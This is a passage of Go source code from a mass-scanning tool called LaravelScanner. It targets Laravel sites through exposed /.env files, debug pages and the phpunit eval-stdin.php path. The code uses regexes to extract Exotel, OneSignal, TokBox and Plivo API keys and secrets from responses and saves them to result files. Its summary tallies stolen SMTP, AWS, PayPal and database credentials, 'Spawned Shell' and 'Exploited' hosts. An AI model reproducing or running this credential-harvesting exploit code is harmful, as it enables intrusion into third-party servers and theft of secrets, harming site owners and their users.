		exotelInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nEXOTEL_API_KEY: %s\nEXOTEL_API_TOKEN: %s\nEXOTEL_API_SID: %s\n\n",
			baseURL, method, exotelApi, exotelToken, exotelSid)

		// Save to EXOTEL.txt
		f, err := os.OpenFile("Results/EXOTEL.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(exotelInfo)
		}
	}

	// Check for OneSignal credentials
	if strings.Contains(content, "ONESIGNAL_APP_ID") {
		var onesignalId, onesignalToken, onesignalAuth string

		if method == "/.env" {
			idRegex := regexp.MustCompile(`ONESIGNAL_APP_ID=(.*?)\n`)
			tokenRegex := regexp.MustCompile(`ONESIGNAL_REST_API_KEY=(.*?)\n`)
			authRegex := regexp.MustCompile(`ONESIGNAL_USER_AUTH_KEY=(.*?)\n`)

			if matches := idRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalId = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalToken = matches[1]
			}
			if matches := authRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalAuth = matches[1]
			}
		} else if method == "debug" {
			idRegex := regexp.MustCompile(`<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			tokenRegex := regexp.MustCompile(`<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			authRegex := regexp.MustCompile(`<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := idRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalId = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalToken = matches[1]
			}
			if matches := authRegex.FindStringSubmatch(content); len(matches) > 1 {
				onesignalAuth = matches[1]
			}
		}

		l.mutex.Lock()
		l.onesignal++
		l.mutex.Unlock()

		l.logger.Success("OneSignal credentials found: " + url)

		// Build the credential string
		baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
		onesignalInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nONESIGNAL_APP_ID: %s\nONESIGNAL_REST_API_KEY: %s\nONESIGNAL_USER_AUTH_KEY: %s\n\n",
			baseURL, method, onesignalId, onesignalToken, onesignalAuth)

		// Save to ONESIGNAL.txt
		f, err := os.OpenFile("Results/ONESIGNAL.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(onesignalInfo)
		}
	}

	// Check for TokBox credentials (multiple patterns)
	tokboxPatterns := []struct {
		keyName          string
		secretName       string
		keyRegex         string
		secretRegex      string
		debugKeyRegex    string
		debugSecretRegex string
	}{
		{
			keyName:          "TOKBOX_KEY_DEV",
			secretName:       "TOKBOX_SECRET_DEV",
			keyRegex:         `TOKBOX_KEY_DEV=(.*?)\n`,
			secretRegex:      `TOKBOX_SECRET_DEV=(.*?)\n`,
			debugKeyRegex:    `<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		{
			keyName:          "TOKBOX_KEY",
			secretName:       "TOKBOX_SECRET",
			keyRegex:         `TOKBOX_KEY=(.*?)\n`,
			secretRegex:      `TOKBOX_SECRET=(.*?)\n`,
			debugKeyRegex:    `<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		{
			keyName:          "TOKBOX_KEY_OLD",
			secretName:       "TOKBOX_SECRET_OLD",
			keyRegex:         `TOKBOX_KEY_OLD=(.*?)\n`,
			secretRegex:      `TOKBOX_SECRET_OLD=(.*?)\n`,
			debugKeyRegex:    `<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugSecretRegex: `<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
	}

	for _, pattern := range tokboxPatterns {
		if strings.Contains(content, pattern.keyName) {
			var tokboxKey, tokboxSecret string

			if method == "/.env" {
				keyRegex := regexp.MustCompile(pattern.keyRegex)
				secretRegex := regexp.MustCompile(pattern.secretRegex)

				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					tokboxKey = matches[1]
				}
				if matches := secretRegex.FindStringSubmatch(content); len(matches) > 1 {
					tokboxSecret = matches[1]
				}
			} else if method == "debug" {
				keyRegex := regexp.MustCompile(pattern.debugKeyRegex)
				secretRegex := regexp.MustCompile(pattern.debugSecretRegex)

				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					tokboxKey = matches[1]
				}
				if matches := secretRegex.FindStringSubmatch(content); len(matches) > 1 {
					tokboxSecret = matches[1]
				}
			}

			if tokboxKey != "" && tokboxSecret != "" {
				l.mutex.Lock()
				l.tokbox++
				l.mutex.Unlock()

				l.logger.Success("TokBox credentials found: " + url)

				// Build the credential string
				baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
				tokboxInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nTOKBOX_KEY: %s\nTOKBOX_SECRET: %s\n\n",
					baseURL, method, tokboxKey, tokboxSecret)

				// Save to TOKBOX.txt
				f, err := os.OpenFile("Results/TOKBOX.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					defer f.Close()
					f.WriteString(tokboxInfo)
				}
			}
		}
	}

	// Check for Plivo credentials
	if strings.Contains(content, "PLIVO_AUTH_ID") {
		var plivoAuth, plivoToken string

		if method == "/.env" {
			authRegex := regexp.MustCompile(`PLIVO_AUTH_ID=(.*?)\n`)
			tokenRegex := regexp.MustCompile(`PLIVO_AUTH_TOKEN=(.*?)\n`)

			if matches := authRegex.FindStringSubmatch(content); len(matches) > 1 {
				plivoAuth = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				plivoToken = matches[1]
			}
		} else if method == "debug" {
			authRegex := regexp.MustCompile(`<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			tokenRegex := regexp.MustCompile(`<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>`)

			if matches := authRegex.FindStringSubmatch(content); len(matches) > 1 {
				plivoAuth = matches[1]
			}
			if matches := tokenRegex.FindStringSubmatch(content); len(matches) > 1 {
				plivoToken = matches[1]
			}
		}

		if plivoAuth != "" && plivoToken != "" {
			l.mutex.Lock()
			l.plivo++
			l.mutex.Unlock()

			l.logger.Success("Plivo credentials found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			plivoInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nPLIVO_AUTH_ID: %s\nPLIVO_AUTH_TOKEN: %s\n\n",
				baseURL, method, plivoAuth, plivoToken)

			// Save to PLIVO.txt
			f, err := os.OpenFile("Results/PLIVO.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(plivoInfo)
			}
		}
	}

	// Only save full results if we have valid environment variables with credentials
	// and it's not just an error page with some env vars
	if (method == "/.env" && isValidEnvContent(content, "/.env") && hasCredentials(content, "/.env")) ||
		(method == "debug" && isValidEnvContent(content, "debug") && hasCredentials(content, "debug") &&
			!strings.Contains(content, "Whoops! There was an error") &&
			!strings.Contains(content, "Stack trace:") &&
			!strings.Contains(content, "Exception:") &&
			!strings.Contains(content, "Error:")) {

		l.mutex.Lock()
		l.plivo++ // This counter is being used incorrectly here, but keeping for compatibility
		l.mutex.Unlock()

		l.logger.Success("Full environment data found: " + url)

		// Save to FULL_RESULTS.txt
		f, err := os.OpenFile("Results/FULL_RESULTS.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()

			// Add a header to separate different results
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			header := fmt.Sprintf("\n\n==== URL: %s | METHOD: %s | TIMESTAMP: %s ====\n\n",
				baseURL, method, time.Now().Format("2006-01-02 15:04:05"))

			f.WriteString(header + content)
		}
	}
}

func (l *LaravelScanner) incrementBad() {
	l.mutex.Lock()
	l.bad++
	l.mutex.Unlock()
}

func (l *LaravelScanner) Start() {
	l.logger.Info("Starting Laravel Scanner")
	l.logger.Info("URLS: " + strconv.Itoa(len(l.urls)))

	var workerThreads int
	fmt.Print("Enter number of worker threads: ")
	fmt.Scanln(&workerThreads)

	if workerThreads <= 0 {
		workerThreads = 10 // Default to 10 threads if invalid input
	}

	jobs := make(chan string, len(l.urls))

	var wg sync.WaitGroup
	for i := 0; i < workerThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for url := range jobs {
				l.scanUrl(url)
			}
		}()
	}

	for _, url := range l.urls {
		jobs <- url
	}

	close(jobs)
	wg.Wait()
	l.saveToFile()

	// Print summary
	l.logger.Info(fmt.Sprintf("SMTP: %d", l.smtp))
	l.logger.Info(fmt.Sprintf("TWILIO: %d", l.twillio))
	l.logger.Info(fmt.Sprintf("AWS: %d", l.aws))
	l.logger.Info(fmt.Sprintf("PayPal: %d", l.paypal))
	l.logger.Info(fmt.Sprintf("Nexmo: %d", l.nexmo))
	l.logger.Info(fmt.Sprintf("Database: %d", l.database))
	l.logger.Info(fmt.Sprintf("Exotel: %d", l.exotel))
	l.logger.Info(fmt.Sprintf("OneSignal: %d", l.onesignal))
	l.logger.Info(fmt.Sprintf("TokBox: %d", l.tokbox))
	l.logger.Info(fmt.Sprintf("Plivo: %d", l.plivo))
	l.logger.Success(fmt.Sprintf("Spawned Shell: %d", l.shells))
	l.logger.Info(fmt.Sprintf("Exploited: %d", l.vulnerable))
	l.logger.Error(fmt.Sprintf("Not Vulnerable: %d", l.bad))

	l.logger.Success("Laravel Scanner completed")
}

func (l *LaravelScanner) saveToFile() {
	// This method can be used to save any additional results or summary
	// Currently, individual results are saved in their respective methods

	// Save not vulnerable URLs
	f, err := os.OpenFile("Results/not_vulnerable.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		// This would require tracking which URLs were not vulnerable
		// Currently we're just incrementing a counter
	}
}
